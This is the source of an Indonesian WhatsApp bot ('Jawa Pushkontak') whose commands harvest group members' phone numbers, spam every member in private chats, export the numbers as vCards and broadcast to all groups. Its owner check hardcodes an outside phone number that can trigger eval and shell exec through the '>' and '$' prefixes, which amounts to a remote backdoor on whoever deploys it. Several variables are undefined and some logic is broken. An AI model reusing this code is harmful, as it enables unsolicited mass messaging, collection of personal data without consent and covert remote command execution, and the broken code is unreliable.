require("./setting")
const {
    smsg, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction')
const { downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage } = require('@whiskeysockets/baileys')
const axios = require('axios')
const os = require('os')
const fs = require('fs')
const util = require('util')
const cron = require('node-cron')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const ytdl = require("ytdl-core")
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const { toPTT, toAudio } = require("./lib/converter")
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
const pino = require('pino')
//  Base
module.exports = async (Jawa, m) => {
    try {
        const from = m.key.remoteJid
        const quoted = m.quoted ? m.quoted : m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') && m.message.buttonsResponseMessage.selectedButtonId ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') && m.message.listResponseMessage.singleSelectreply.selectedRowId ? m.message.listResponseMessage.singleSelectreply.selectedRowId : (m.mtype == 'templateButtonreplyMessage') && m.message.templateButtonreplyMessage.selectedId ? m.message.templateButtonreplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') && JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreply.selectedRowId || m.text) : ""
        var budy = (typeof m.text == 'string' ? m.text : '')
        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1)
        const text = q = args.join(" ")
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const botNumber = await Jawa.decodeJid(Jawa.user.id)
        const senderNumber = sender.split('@')[0]
        const isCreator = ["62895359528183@s.whatsapp.net", botNumber, ...global.ownNumb].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const pushname = m.pushName || `${senderNumber}`
        const isBot = botNumber.includes(senderNumber)
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        // Group
        const groupMetadata = m.isGroup ? await Jawa.groupMetadata(m.chat).catch(e => { }) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false

        //Ini Waktu | Waktu adalah emas,maka dari itu sentuh lah rumput.dan jangan nolep dikamar terus,usahakan tu kontol jangan dikocok terus.Lutut ama sikut lu kopong nanti
        const moment = require('moment-timezone')
        const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss")
        if (time2 < "19:00:00") {
            var ucapanWaktu = "Selamat Malam🌃"
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = "Selamat Sore🌄"
        }
        if (time2 < "11:00:00") {
            var ucapanWaktu = "Selamat Siang🏞️"
        }
        if (time2 < "06:00:00") {
            var ucapanWaktu = "Selamat Pagi🏙️ "
        }
        if (time2 < "23:59:00") {
            var ucapanWaktu = "Selamat Subuh🌆"
        }
        const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
        const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
        const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
        const salam2 = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
        const fkontak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Jawa Store`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;JawaBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/a915fdf6f21ad99179f15.jpg' } } } }
        //Public dan Self
        if (!Jawa.public) {
            if (!isCreator && !m.key.fromMe) return
        }


        function rumus(tMatch, tWr, wrReq) {
            let tWin = tMatch * (tWr / 100);
            let tLose = tMatch - tWin;
            let sisaWr = 100 - wrReq;
            let wrResult = 100 / sisaWr;
            let seratusPersen = tLose * wrResult;
            let final = seratusPersen - tMatch;
            return Math.round(final);
        }

        function rumusLose(tMatch, tWr, wrReq) {
            let persen = tWr - wrReq;
            let final = tMatch * (persen / 100);
            return Math.round(final);
        }




        //tampilan console
        if (m.message) {
            if (isCmd && !m.isGroup) {
                console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
                console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`ADA PESAN NIH`)));
                console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
            } else if (m.isGroup) {
                console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
                console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`ADA PESAN NIH`)));
                console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`)));
            }
        }
        //


        //

        const fVerif = {
            key: {
                participant: '0@s.whatsapp.net',
                remoteJid: '0@s.whatsapp.net'
            },
            message: { conversation: `_Jawa Terverifikasi Oleh WhatsApp_` }
        }
        const reply = async (teks) => {
            Jawa.sendMessage(
                from,
                {
                    text:
                        teks,
                    contextInfo:
                    {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo:
                        {
                            newsletterName: 'Jawa-Pushkontak',
                            newsletterJid: "6289535952183@s.whatsapp.net",
                        }
                    }
                },
                { quoted: fVerif }
            )
        }


        if (global.autoBio) {
            Jawa.updateProfileStatus(`PUSHKONTAK Jawa IS ONLINE | RUNTIME: ${runtime(process.uptime())} `).catch(_ => _)
        }


        const tag = `@${m.sender.split('@')[0]}`
        const totalFitur = () => {
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }


        switch (command) {
            case "menu": {


                wek = `
╔═══━━━─── • ───━━━═══╗
     H a i i @${m.sender.split('@')[0]}
      Ada Yang Bisa Saya Bantu??
╚═══━━━─── • ───━━━═══╝

╭━━━⊰❲ M E N U  P U S H ❳⊱━━━╮
│    ◦ NamaBot: *${botname}*
│    ◦ NamaOwner: *${namaowner}*
│    ◦ Version: *1.0*
│    ◦ free: Yes
╰━━━──────────⊷━━━╯

╔═══━━━─── • ───━━━═══╗
  Dimohon Untuk Tidak Melakukan
       Spam Kepada Bot
╚═══━━━─── • ───━━━═══╝
`
                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: wek
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: "© Jawa Pushkontak"
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    ...(await prepareWAMessageMedia({ image: fs.readFileSync('./media/Jawa.png') }, { upload: Jawa.waUploadToServer })),
                                    title: ``,
                                    gifPlayback: true,
                                    subtitle: ownername,
                                    hasMediaAttachment: false
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [
                                        {
                                            "name": "single_select",
                                            "buttonParamsJson":
                                                `{"title":"Menampilkan Menu",
"sections":[{"title":"List Feature",
"highlight_label": "Favorite Request",
"rows":[{"header":"",
"title":"PushKontak Menu",
"description":"displays the pushcontact menu",
"id":"${prefix}pushmenu"}]
}]
}`
                                        },

                                    ],
                                }),
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    forwardingScore: 999,
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: '120363185387746998@newsletter',
                                        newsletterName: 'Jawa-PushKontak',
                                        serverMessageId: 143
                                    }
                                }
                            })
                        }
                    },
                }, {})

                await Jawa.relayMessage(msg.key.remoteJid, msg.message, {
                    messageId: msg.key.id
                })
            }
                break

            case 'pushmenu': {
                let wek = `╭━━❲ *𝐌𝐄𝐍𝐔 𝐏𝐔𝐒𝐇𝐊𝐎𝐍𝐓𝐀𝐊* ❳ 
│ • ᴄᴇᴋɪᴅɢᴄ
│ • ɪᴅɢʀᴜᴘ
│ • ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ1
│ • ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ2
│ • ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ3
│ • ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ4
│ • ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ5
│ • sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1
│ • sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│ • ɢᴇᴛᴄᴏɴᴛᴀᴄᴛ
│ • sᴇɴᴅᴋᴏɴᴛᴀᴋ
│ • ᴊᴘᴍ
╰╾──────────⊷ `
                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: wek
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: "© Jawa Pushkontak"
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    ...(await prepareWAMessageMedia({ image: fs.readFileSync('./media/Jawa.png') }, { upload: Jawa.waUploadToServer })),
                                    title: ``,
                                    gifPlayback: true,
                                    subtitle: ownername,
                                    hasMediaAttachment: false
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [
                                        {
                                            "name": "quick_reply",
                                            "buttonParamsJson": `{"display_text":"Back","id":"${prefix}menu"}`
                                        },
                                        {
                                            "name": "cta_url",
                                            "buttonParamsJson": "{\"display_text\":\"YouTube\",\"url\":\"https://youtube.com/@JawaXD_1\",\"merchant_url\":\"https://www.google.com\"}"
                                        },

                                    ],
                                }),
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    forwardingScore: 999,
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: '120363185387746998@newsletter',
                                        newsletterName: 'Jawa-PushKontak',
                                        serverMessageId: 143
                                    }
                                }
                            })
                        }
                    },
                }, {})

                await Jawa.relayMessage(msg.key.remoteJid, msg.message, {
                    messageId: msg.key.id
                })
            }
                break





            //ᴍᴇɴᴜ ᴘᴜsʜ
            case "cekidgc": {
                if (!isCreator) return reply('owneronly')
                let getGroups = await Jawa.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
                let anu = groups.map((v) => v.id)
                let teks = `⬣ LIST GROUP BY Jawa\n\nTotal Group : ${anu.length} Group\n\n`
                for (let x of anu) {
                    let metadata2 = await Jawa.groupMetadata(x)
                    teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
                }
                reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
            }
                break
            case "idgroup": case 'idgrup': {
                if (!isCreator) return khususOwner()
                let getGroups = await Jawa.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
                let anu = groups.map((v) => v.id)
                let teks = `⬣ *LIST GROUP ANDA*\n\nTotal Group : ${anu.length} GROUP\n\n`
                for (let x of anu) {
                    let metadata2 = await Jawa.groupMetadata(x)
                    teks += `❏ *INFO GROUP*\n│┆❐  *NAMA :* ${metadata2.subject}\n│┆❐  *ID :* ${metadata2.id}\n│┆❐  *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
                }
                reply(teks + `Untuk Penggunaan Silahkan Ketik\nCommand ${prefix}pushkontak id|teks`)
            }
                break
            case "pushkontakv1": {
                if (!isCreator) return reply(mess.owner)
                if (isGroup) return reply(mess.only.private)
                if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix + command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
                reply(mess.wait)
                const groupMetadataa = !m.isGroup ? await Jawa.groupMetadata(`${text.split("|")[0]}`).catch(e => { }) : ""
                const participants = !m.isGroup ? await groupMetadataa.participants : ""
                const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
                global.tekspushkon = text.split("|")[1]
                if (isContacts) return
                for (let mem of halls) {
                    if (isContacts) return
                    contacts.push(mem)
                    fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
                    if (/image/.test(mime)) {
                        media = await Jawa.downloadAndSaveMediaMessage(quoted)
                        memk = await TelegraPh(media)
                        await Jawa.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
                        await sleep(1000)
                    } else {
                        await Jawa.sendMessage(mem, { text: global.tekspushkon })
                        await sleep(1000)
                    }
                }
                try {
                    const uniqueContacts = [...new Set(contacts)];
                    const vcardContent = uniqueContacts.map((contact, index) => {
                        const vcard = [
                            "BEGIN:VCARD",
                            "VERSION:3.0",
                            `FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
                            `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                            "END:VCARD",
                            "",].join("\n");
                        return vcard;
                    }).join("");
                    fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
                } catch (err) {
                    reply(util.format(err))
                } finally {
                    await Jawa.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
                    contacts.splice(0, contacts.length)
                    fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
                }
            }
                break
            case "pushkontakv2": {
                if (!isCreator) return reply(mess.owner)
                if (!m.isGroup) return reply(mess.only.group)
                if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix + command} teks`)
                reply(mess.wait)
                const groupMetadata = isGroup ? await Jawa.groupMetadata(from).catch(e => { }) : ""
                const groupOwner = isGroup ? groupMetadata.owner : ""
                const participantts = isGroup ? await groupMetadata.participants : ""
                const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
                global.tekspushkonv2 = text
                if (isContacts) return
                for (let men of halsss) {
                    contacts.push(men)
                    fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
                    if (/image/.test(mime)) {
                        media = await Jawa.downloadAndSaveMediaMessage(quoted)
                        mem = await TelegraPh(media)
                        await Jawa.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
                        await sleep(1000)
                    } else {
                        await Jawa.sendMessage(men, { text: global.tekspushkonv2 })
                        await sleep(1000)
                    }
                }
                reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
                try {
                    const uniqueContacts = [...new Set(contacts)];
                    const vcardContent = uniqueContacts.map((contact, index) => {
                        const vcard = [
                            "BEGIN:VCARD",
                            "VERSION:3.0",
                            `FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
                            `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                            "END:VCARD",
                            "",].join("\n");
                        return vcard;
                    }).join("");
                    fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
                } catch (err) {
                    reply(util.format(err))
                } finally {
                    await Jawa.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
                    contacts.splice(0, contacts.length)
                    fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
                }
            }
                break
            case "pushkontakv3":
                if (!isCreator) return reply(mess.owner)
                if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix + command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
                await reply("Otw Boskuuu")
                const groupMetadataa = !m.isGroup ? await Jawa.groupMetadata(`${q.split("|")[0]}`).catch(e => { }) : ""
                const participantss = !m.isGroup ? await groupMetadataa.participants : ""
                const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
                global.tekspushkonv3 = q.split("|")[2]
                for (let mem of halls) {
                    if (/image/.test(mime)) {
                        media = await Jawa.downloadAndSaveMediaMessage(quoted)
                        memk = await TelegraPh(media)
                        await Jawa.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
                        await sleep(q.split("|")[1])
                    } else {
                        await Jawa.sendMessage(mem, { text: global.tekspushkonv3 })
                        await sleep(q.split("|")[1])
                    }
                }
                reply("Succes Boss!")
                break
            case "pushjeda":
                if (!isCreator) return reply(`Khusus Jawa`)
                if (!m.isGroup) return reply(mess.only.group)
                if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix + command} jeda|teks`)
                await reply("𝒑𝒓𝒐𝒄𝒄𝒆𝒔")
                const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
                global.tekspushkonv4 = text.split("|")[1]
                for (let men of halsss) {
                    if (/image/.test(mime)) {
                        media = await Jawa.downloadAndSaveMediaMessage(quoted)
                        mem = await uptotelegra(media)
                        await Jawa.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
                        await sleep(text.split("|")[0])
                    } else {
                        await Jawa.sendMessage(men, { text: global.tekspushkonv4 })
                        await sleep(text.split("|")[0])
                    }
                }
                reply("𝑫𝒐𝒏𝒆!")
                break
            case 'pushkontakv5': {
                if (!isCreator) return khususOwner()
                if (!msg.isGroup) return reply(`Maaf Kak Fitur ${prefix + command} Hanya Bisa Di Gunakan Di Dalam Group`)
                if (!q) return reply(`text?`)
                let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
                reply(`Succes Get Member`)
                for (let pler of mem) {
                    Jawa.sendMessage(pler, { text: q })
                }

                reply(`Succes Push Kontak`)
            }
                break
            case "savecontactv1": {
                if (!isCreator) return reply(mess.owner)
                if (!text) return reply(`Maaf Kak Fitur ${prefix + command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
                await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
                const groupMetadata = isGroup ? await Jawa.groupMetadata(from).catch(e => { }) : ""
                const groupOwner = isGroup ? groupMetadata.owner : ""
                const participantts = isGroup ? await groupMetadata.participants : ""
                const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
                for (let men of halsss) {
                    if (isContacts) return
                    contacts.push(men)
                    fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
                }
                reply("Sukses File Sudah Di Kirim Lewat Chat Private")
                try {
                    const uniqueContacts = [...new Set(contacts)];
                    const vcardContent = uniqueContacts.map((contact, index) => {
                        const vcard = [
                            "BEGIN:VCARD",
                            "VERSION:3.0",
                            `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
                            `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                            "END:VCARD",
                            "",].join("\n");
                        return vcard;
                    }).join("");
                    fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
                } catch (err) {
                    reply(util.format(err))
                } finally {
                    await Jawa.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
                    contacts.splice(0, contacts.length)
                    fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
                }
            }
                break
            case 'getcontact': case 'getkontak':
                if (!isCreator) return reply(mess.owner)
                if (!m.isGroup) return m.reply(`Khusus Group Kontol`)
                huhuhs = await Jawa.sendMessage(m.chat, {
                    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
                }, { quoted: m, ephemeralExpiration: 86400 })
                await sleep(1000) // (?); mengirim kontak seluruh member
                Jawa.sendContact(m.chat, participants.map(a => a.id), huhuhs)
                break
            case 'savekontak': case 'svkontak':
                if (!isCreator) return reply(mess.owner)
                if (!m.isGroup) return m.reply(`Khusus Group Kontol`)
                let cmiggc = await Jawa.groupMetadata(m.chat)
                let orgiggc = participants.map(a => a.id)
                vcard = ''
                noPort = 0
                for (let a of cmiggc.participants) {
                    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
                } // (?); mengimpor kontak seluruh member - save
                let nmfilect = './contacts.vcf'
                reply('*Mengimpor ' + cmiggc.participants.length + ' kontak..*')
                fs.writeFileSync(nmfilect, vcard.trim())
                await sleep(2000)
                Jawa.sendMessage(m.chat, {
                    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *' + cmiggc.subject + '*\nMEMBER: *' + cmiggc.participants.length + '*'
                }, { ephemeralExpiration: 86400, quoted: m })
                fs.unlinkSync(nmfilect)
                break
            case 'sendkontak': case 'kontak':
                if (!isCreator) return reply(mess.owner)
                if (!m.isGroup) return m.reply(mess.group)
                if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
                let snTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
                let snContact = {
                    displayName: "Contact", contacts: [{ displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + snTak + ";;;\nFN:" + snTak + "\nitem1.TEL;waid=" + m.mentionedJid[0].split('@')[0] + ":" + m.mentionedJid[0].split('@')[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD" }]
                } // (?); send kontak
                Jawa.sendMessage(m.chat, { contacts: snContact }, { ephemeralExpiration: 86400 })
                break
            case "savecontactv2": {
                if (!isCreator) return reply(mess.owner)
                if (!m.isGroup) return reply(mess.only.private)
                if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix + command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
                await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
                const groupMetadataa = !m.isGroup ? await Jawa.groupMetadata(`${text}`).catch(e => { }) : ""
                const participants = !m.isGroup ? await groupMetadataa.participants : ""
                const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
                for (let mem of halls) {
                    if (isContacts) return
                    contacts.push(mem)
                    fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
                }
                try {
                    const uniqueContacts = [...new Set(contacts)];
                    const vcardContent = uniqueContacts.map((contact, index) => {
                        const vcard = [
                            "BEGIN:VCARD",
                            "VERSION:3.0",
                            `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
                            `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                            "END:VCARD",
                            "",].join("\n");
                        return vcard;
                    }).join("");
                    fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
                } catch (err) {
                    reply(util.format(err))
                } finally {
                    await Jawa.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
                    contacts.splice(0, contacts.length)
                    fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
                }
            }
                break
            case "jpm": case "post": {
                if (!isCreator) return reply(mess.owner)
                if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix + command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
                await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
                let getGroups = await Jawa.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
                let anu = groups.map((v) => v.id)
                for (let xnxx of anu) {
                    let metadat72 = await Jawa.groupMetadata(xnxx)
                    let participanh = await metadat72.participants
                    if (/image/.test(mime)) {
                        media = await Jawa.downloadAndSaveMediaMessage(quoted)
                        mem = await TelegraPh(media)
                        await Jawa.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
                        await sleep(text.split('|')[1])
                    } else {
                        await Jawa.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
                        await sleep(text.split('|')[1])
                    }
                }
                reply("*SUCCESFUL ✅*")
            }
                break
            //ᴀᴋʜɪʀ ᴍᴇɴᴜᴘᴜsʜ
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }










                if (budy.startsWith('>')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }
        }

    } catch (err) {
        console.log(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`Update ${__filename}`)
    delete require.cache[file]
    require(file)
})
